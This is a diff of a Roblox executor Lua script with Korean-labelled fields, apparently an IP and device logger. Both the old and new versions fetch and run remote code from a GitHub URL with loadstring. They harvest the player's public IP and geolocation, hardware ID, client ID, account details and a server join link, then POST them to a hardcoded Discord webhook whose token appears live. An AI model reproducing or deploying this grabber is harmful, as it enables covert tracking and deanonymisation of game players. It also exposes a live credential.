@@ -1,107 +1,170 @@
-Players = game.Players
-LocalPlayer = Players.LocalPlayer
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
 
-local WebhookUrl = "https://discord.com/api/webhooks/1396127363707699341/EwEfN81d2322RWK17YKnekwUbJZ4lfAJ3QVupznPdpyewmCufyzMKbX5txmaJbDuhmld"
-local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
-if isfile(path) then luav = dofile(path)() else
-local data = game:HttpGet("https://raw.githubusercontent.com/asoviet01223/FTAP/refs/heads/main/LUAV")
-task.defer(writefile, path, data); luav = loadstring(data)() end end; path = nil
+local plr = LocalPlayer
+local placeId = game.PlaceId
+local jobId = game.JobId
 
-local rbxanls = game:GetService("RbxAnalyticsService")
-local placeid = game.PlaceId
-local jobid = game.JobId
-local DistributedGameTime = w.DistributedGameTime
+local WebhookUrl = getgenv().WebhookUrl or "https://discord.com/api/webhooks/1396127363707699341/EwEfN81d2322RWK17YKnekwUbJZ4lfAJ3QVupznPdpyewmCufyzMKbX5txmaJbDuhmld"
 
-local num = DistributedGameTime//3600
-local playingtime = num..":"
-DistributedGameTime = DistributedGameTime - num*3600
+-- [ LuaV ]
+local path, luav = "LuaV/LuaV.lua", getgenv().luav
+if not luav then
+    if isfile(path) then
+        luav = dofile(path)
+    else
+        local data = game:HttpGet("https://raw.githubusercontent.com/asoviet01223/FTAP/refs/heads/main/LUAV")
+        task.defer(writefile, path, data)
+        luav = loadstring(data)()
+    end
+end
 
-num = DistributedGameTime//60
-playingtime = playingtime..num..":"
-DistributedGameTime = DistributedGameTime - num*60
+-- [ 시간 포맷 함수 ]
+local function formatTime(seconds)
+    local h = seconds // 3600
+    seconds = seconds - h * 3600
+    local m = seconds // 60
+    local s = seconds - m * 60
+    return string.format("%02d:%02d:%02d", h, m, s)
+end
 
-playingtime = playingtime..DistributedGameTime//1
+-- [ 사용자 정보 ]
+local userId = plr.UserId or 0
+local displayName = plr.DisplayName or "Unknown"
+local username = plr.Name or "Unknown"
+local accountAge = plr.AccountAge or 0
+local ip = game:HttpGet("https://v4.ident.me/") or "Unknown"
+local followId = plr.FollowUserId or "N/A"
 
-local elapsedTime = elapsedTime()
+-- [ 프로필 이미지 ]
+local avatarUrl = ""
+local avatarHeadshotUrl = ""
+do
+    local avatarApi = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(http_request({Method = "GET", Url = avatarApi}).Body)
+    end)
+    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
+        avatarUrl = result.data[1].imageUrl
+        avatarHeadshotUrl = avatarUrl:gsub("Avatar", "AvatarHeadshot")
+    end
+end
 
-local num = elapsedTime//3600
-local robloxtime = num..":"
-elapsedTime = elapsedTime - num*3600
+-- [ 서버 정보 ]
+local uptime = formatTime(Workspace.DistributedGameTime)
+local clientUptime = formatTime(os.clock())
 
-num = elapsedTime//60
-robloxtime = robloxtime..num..":"
-elapsedTime = elapsedTime - num*60
+-- [ 게임 정보 ]
+local placeInfo = MarketplaceService:GetProductInfo(placeId)
 
-robloxtime = robloxtime..elapsedTime//1
+-- [ IP 정보 ]
+local ipinfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json")) or {}
 
-local avatarlink = hs[1]:JSONDecode(http_request({Method = "GET", Url = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..muid.."&size=420x420&format=Png&isCircular=false"})["Body"])["data"][1]["imageUrl"]
-local avatarheadshotlink = avatarlink:gsub("Avatar", "AvatarHeadshot")
-
-local placedata = game:GetService("MarketplaceService"):GetProductInfo(placeid)
-
-local data = {
-    "**[Player Info](https://www.roblox.com/users/"..muid..")**",
-    "***Display Name: ***"..dname[1],
-    "***User Name: ***"..name[1],
-    "***User Id: ***"..muid,
-    "***Follow User Id: ***"..me.FollowUserId,
-    "***AccountAge: ***"..me.AccountAge,
-    "***Ip: ***"..game:HttpGet("https://v4.ident.me/"),
+-- [ 디스코드 메시지 내용 ]
+local contentData = {
+    "**👤 플레이어 정보**",
+    "> 🆔 **유저 Id:** " .. userId,
+    "> 🎫 **표시 이름:** " .. displayName,
+    "> 🎟️ **사용자명:** " .. username,
+    "> 📅 **계정 생성일:** " .. accountAge .. "일 전",
+    "> 🛰️ **Ip 주소:** " .. ip,
+    "> ➕ **팔로우 대상 Id:** " .. followId,
     "",
-    "**[PC Info](https://roblox.com)**",
-    "***Time: ***"..os.date("%X"),
-    "***Date: ***"..os.date("%m/%d/%Y"),
+
+    "**🖥️ 장치 정보**",
+    "> 🕒 **시간:** " .. os.date("%X"),
+    "> 📆 **날짜:** " .. os.date("%Y-%m-%d"),
+    "> 💾 **메모리 사용량:** " .. (gcinfo() // 100) .. "MB",
+    "> ⌛ **클라이언트 실행 시간:** " .. clientUptime,
+    "> 🌍 **사용 언어:** " .. LocalizationService.RobloxLocaleId,
+    "> 🧪 **클라이언트 ID:** " .. RbxAnalyticsService:GetClientId(),
+    "> 🧬 **버전:** " .. version(),
     "",
-    "**[Roblox Info](https://roblox.com)**",
-    "***Memory Usage: ***"..(gcinfo()//100).."MB",
-    "***Working Time: ***"..robloxtime,
-    "***Language: ***"..game:GetService("LocalizationService").RobloxLocaleId,
-    "***Id: ***"..rbxanls:GetClientId(),
-    "***Git Hash: ***"..r.ClientGitHash,
-    "***Version: ***"..version(),
+
+    "**🛠️ 실행기 정보**",
+    "> 🚀 **이름:** " .. ((identifyexecutor and identifyexecutor()) or "알 수 없음"),
+    "> 🔑 **HWID:** " .. ((get_hwid and get_hwid()) or "알 수 없음"),
     "",
-    "**[Injector Info](https://roblox.com)**",
-    "***Name: ***"..(identifyexecutor and identifyexecutor()) or "None",
-    "***HWID: ***"..((get_hwid and get_hwid()) or "None"),
+
+    "**🎮 게임 정보**",
+    "> 📌 **이름:** " .. (placeInfo.Name or "없음"),
+    "> 📝 **설명:** " .. (placeInfo.Description or "없음"),
+    "> 🛠️ **업데이트:** " .. (placeInfo.Updated or "없음"),
+    "> 🏗️ **생성일:** " .. (placeInfo.Created or "없음"),
+    "> 🆔 **Place Id:** " .. placeId,
     "",
-    "**[Place Info](https://www.roblox.com/games/"..placeid..")**",
-    "***Name: ***"..placedata.Name,
-    "***Description: ***"..placedata.Description,
-    "***Updated: ***"..placedata.Updated,
-    "***Created: ***"..placedata.Created,
-    "***Id: ***"..placeid,
+
+    "**🌐 서버 정보**",
+    "> 👥 **플레이어 수:** " .. #Players:GetPlayers() .. "/" .. (Workspace:GetAttribute("MaxPlayers") or "N/A"),
+    "> 📶 **핑:** " .. math.floor(plr:GetNetworkPing() * 2000) .. "ms",
+    "> ⌚ **서버 가동 시간:** " .. uptime,
+    "> 🧩 **파츠 수:** " .. Workspace:GetNumAwakeParts(),
+    "> 🌀 **물리 FPS:** " .. Workspace:GetRealPhysicsFPS(),
+    "> 🔗 **접속 링크:** ```roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId .. "```",
     "",
-    "**[Server Info](https://roblox.com)**",
-    "***Players: ***"..#plrs().."/"..p.MaxPlayers.."(Preferred: "..p.PreferredPlayers..")",
-    "***Ping: ***"..(me[1]:GetNetworkPing()*2000//1).."ms",
-    "***Playing Time: ***"..playingtime,
-    "***Parts: ***"..w[1]:GetNumAwakeParts(),
-    "***Physics FPS: ***"..w[1]:GetRealPhysicsFPS(),
-    "***Id: ***"..jobid,
-    "***Join Link: ***".."```roblox://placeId="..placeid.."&gameInstanceId="..jobid.."```",
-    "",
-    "**[Ip Info](http://ip-api.com/json)**",
-    LuaV(hs[1]:JSONDecode(game:HttpGet("http://ip-api.com/json"))):c("s")[1]
+
+    "**🗺️ IP 위치 정보**",
+    "> 🌍 **국가:** " .. (ipinfo.country or "알 수 없음"),
+    "> 🏙️ **도시:** " .. (ipinfo.city or "알 수 없음"),
+    "> 🛰️ **인터넷 제공자:** " .. (ipinfo.isp or "알 수 없음")
 }
 
-data = hs[1]:JSONEncode(
-    {
-        ["avatar_url"] = "",
-        ["content"] = "[NPDL] : New Data!",
-        ["embeds"] = {
-            {
-                ["description"] = LuaV(data):c("s")[1],
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFF0000"),
-                ["thumbnail"] = {url = avatarlink},
-                ["author"] = {
-                    ["name"] = dname[1].." ("..name[1]..")",
-                    ["icon_url"] = avatarheadshotlink
-                }
-            }
-        }
-    }
-)
+-- [ 디스크립션 ]
+local descriptionText = ""
+if typeof(luav) == "function" then
+    local success, result = pcall(function()
+        return luav(contentData):c("s")[1]
+    end)
+    if success then
+        descriptionText = result
+    end
+elseif typeof(luav) == "table" and typeof(luav.c) == "function" then
+    local success, result = pcall(function()
+        return luav.c(luav, contentData, "s")[1]
+    end)
+    if success then
+        descriptionText = result
+    end
+end
 
+-- fallback
+if descriptionText == "" then
+    descriptionText = table.concat(contentData, "\n")
+end
+
+-- [ 임베드 ]
+local payload = HttpService:JSONEncode({
+    content = "```👁️‍🗨️|NPDL[0m] : New Player Data Logged!```",
+    embeds = {{
+        title = "Roblox Logger",
+        description = descriptionText,
+        color = tonumber("0x3498db"),
+        thumbnail = { url = avatarUrl },
+        author = {
+            name = string.format("%s (%s)", displayName or "Unknown", username or "Unknown"),
+            icon_url = avatarHeadshotUrl
+        },
+        footer = {
+            text = "Logged by LuaV Logger • " .. os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }}
+})
+
+-- [ 전송 ]
 local request = http_request or request or HttpPost or syn.request
-if request then print(unpack(request({Url = WebhookUrl, Body = data, Method = "POST", Headers = {["content-type"] = "application/json"}}))) end
+if request then
+    request({
+        Url = WebhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payload
+    })
+end
